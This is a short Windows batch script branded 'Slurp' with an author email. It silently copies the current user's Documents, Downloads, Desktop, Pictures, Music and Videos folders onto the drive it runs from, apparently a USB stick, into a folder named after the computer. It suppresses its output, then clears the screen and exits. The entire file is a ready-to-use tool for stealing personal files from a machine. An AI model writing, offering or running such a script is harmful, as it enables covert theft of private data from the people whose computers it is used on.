@echo off
color 0a
echo ===========================================================
echo                  ___                             
echo                 /\_ \                            
echo             ____\//\ \    __  __  _ __   _____   
echo            /',__\ \ \ \  /\ \/\ \/\`'__\/\ '__`\ 
echo           /\__, `\ \_\ \_\ \ \_\ \ \ \/ \ \ \L\ \
echo           \/\____/ /\____\\ \____/\ \_\  \ \ ,__/
echo            \/___/  \/____/ \/___/  \/_/   \ \ \/ 
echo                                            \ \_\ 
echo                                             \/_/ 
echo.
echo ===========================================================
echo.
echo 		Author: ameg0@tuta.io
echo.
set dest=%~d0\Slurp\%COMPUTERNAME%
mkdir %dest%
@echo --- Slurping Docs ---
if Exist %USERPROFILE%\Documents (
xcopy %USERPROFILE%\Documents %dest% >>nul
)
@echo --- Slurping Downloads ---
if Exist %USERPROFILE%\Downloads (
xcopy %USERPROFILE%\Downloads %dest% >>nul
)
@echo --- Slurping Desktop ---
if Exist %USERPROFILE%\Desktop (
xcopy %USERPROFILE%\Desktop %dest% >>nul
)
@echo --- Slurping Pictures ---
if Exist %USERPROFILE%\Pictures (
xcopy %USERPROFILE%\Pictures %dest% >>nul
)
@echo --- Slurping Music ---
if Exist %USERPROFILE%\Music (
xcopy %USERPROFILE%\Music %dest% >>nul
)
@echo --- Slurping Videos ---
if Exist %USERPROFILE%\Videos (
xcopy %USERPROFILE%\Videos %dest% >>nul
)
@cls
@exit
